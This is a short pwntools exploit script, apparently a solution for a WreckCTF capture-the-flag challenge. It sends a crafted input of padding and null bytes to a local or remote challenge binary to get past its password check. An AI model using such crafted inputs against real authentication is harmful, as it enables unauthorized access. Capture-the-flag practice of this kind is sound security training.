from pwn import *
import sys

binary = "./challenge"

if "remote" in sys.argv:
    sh = remote("challs.wreckctf.com", 31009)
else:
    sh = process(binary)

payload = b"A"*15+b"\x00"+b"A"*15+b"\x00"

sh.sendlineafter(b"Input password", payload)

print(sh.recvall())
